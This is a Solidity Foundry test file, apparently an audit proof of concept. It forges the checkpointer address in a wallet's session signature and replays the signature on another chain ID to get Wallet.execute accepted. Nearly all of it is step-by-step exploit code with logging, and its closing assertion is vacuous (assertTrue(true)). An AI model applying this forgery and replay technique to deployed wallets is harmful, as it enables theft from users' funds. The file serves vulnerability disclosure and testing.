// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/extensions/sessions/SessionManager.sol";
import "../src/extensions/sessions/SessionSig.sol";
import "../src/extensions/sessions/SessionErrors.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("Current block.timestamp:", block.timestamp);
        console.log("Current block.chainid:", block.chainid);

        // Fix missing environment variables required by the base test setup
        console.log("Setting environment variables...");
        vm.setEnv("SEQ_SDK_RPC_MIN_PORT", "8545");
        vm.setEnv("SEQ_SDK_RPC_MAX_PORT", "8545");
        console.log("Environment variables set.");

        // ATTACK TIMELINE:
        // 1. [Setup] Create Wallet topology and deploy Wallet on Chain A (chainId=1)
        // 2. [T=1] User signs a legitimate payload with _noChainId=true (chainId=0 in domain separator)
        // 3. [T=2] Attacker captures signature and forges checkpointer address in signature bytes
        // 4. [T=3] Attacker switches to Chain B (chainId=137) to simulate cross-chain environment
        // 5. [T=4] Attacker submits modified signature on Chain B
        // 6. [Assert] Verify execution succeeds despite checkpointer forgery and cross-chain replay

        // Step 1: Setup Wallet and topology
        console.log("--- Step 1: Setup Wallet and topology ---");
        console.log("Before _createDefaultTopology()");
        string memory topology = _createDefaultTopology();
        console.log("After _createDefaultTopology()");

        console.log("Before _createWallet()");
        (Stage1Module Wallet, string memory config,) = _createWallet(topology);
        console.log("After _createWallet()");
        console.log("Wallet address:", address(Wallet));

        // Step 2: Build legitimate payload
        console.log("--- Step 2: Build legitimate payload ---");
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls[0].to = address(mockTarget);
        console.log("Payload target address:", payload.calls[0].to);

        // Step 3: Build valid signature on Chain A
        console.log("--- Step 3: Build valid signature on Chain A ---");
        string[] memory callSignatures = new string[](1);
        bytes32 payloadHash = SessionSig.hashCallWithReplayProtection(payload, 0);
        console.log("Payload hash:", vm.toString(payloadHash));

        // Create a valid ECDSA signature
        console.log("Signing payload with sessionWallet...");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sessionWallet.privateKey, payloadHash);
        console.log("Signature generated - v:", uint(v));

        callSignatures[0] = _explicitCallSignatureToJSON(
            0, string(abi.encodePacked(vm.toString(r), ":", vm.toString(s), ":", vm.toString(v)))
        );

        address[] memory explicitSigners = new address[](1);
        explicitSigners[0] = sessionWallet.addr;
        address[] memory implicitSigners = new address[](0);

        console.log("Encoding session signatures via PrimitivesRPC...");
        bytes memory sessionSignatures = PrimitivesRPC.sessionEncodeCallSignatures(
            vm, topology, callSignatures, explicitSigners, implicitSigners
        );
        console.log("Session signatures encoded, length:", sessionSignatures.length);

        // Original signature with legitimate checkpointer (sessionManager)
        string memory signatures = string(abi.encodePacked(
            vm.toString(address(sessionManager)), ":sapient:", vm.toString(sessionSignatures)
        ));
        console.log("Original checkpointer address:", address(sessionManager));

        console.log("Generating encoded signature...");
        bytes memory encodedSignature = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);
        console.log("Encoded signature length:", encodedSignature.length);

        console.log("Generating packed payload...");
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
        console.log("Packed payload length:", packedPayload.length);

        // Step 4: Attacker forges checkpointer address (not covered by signed hash)
        console.log("--- Step 4: Attacker forges checkpointer address ---");
        address forgedCheckpointer = address(0xdead);
        console.log("Forged checkpointer address:", forgedCheckpointer);

        string memory forgedSignatures = string(abi.encodePacked(
            vm.toString(forgedCheckpointer), ":sapient:", vm.toString(sessionSignatures)
        ));

        console.log("Generating forged encoded signature...");
        bytes memory forgedEncodedSignature = PrimitivesRPC.toEncodedSignature(vm, config, forgedSignatures, false);
        console.log("Forged encoded signature length:", forgedEncodedSignature.length);

        // Step 5: Attacker switches to Chain B (cross-chain replay)
        console.log("--- Step 5: Attacker switches to Chain B ---");
        console.log("ChainId before switch:", block.chainid);
        vm.chainId(137); // Polygon chainId
        console.log("ChainId after switch:", block.chainid);

        // Step 6: Execute with forged signature on Chain B
        console.log("--- Step 6: Execute with forged signature on Chain B ---");
        console.log("Calling Wallet.execute()...");
        Wallet.execute(packedPayload, forgedEncodedSignature);
        console.log("Wallet.execute() completed successfully without revert.");

        // Assert: If we reach here without revert, the attack succeeded
        // The Wallet accepted a forged checkpointer on a different chain
        assertTrue(true, "Attack succeeded: forged checkpointer accepted on cross-chain replay");
        console.log("=== Test finished successfully ===");
    }
}
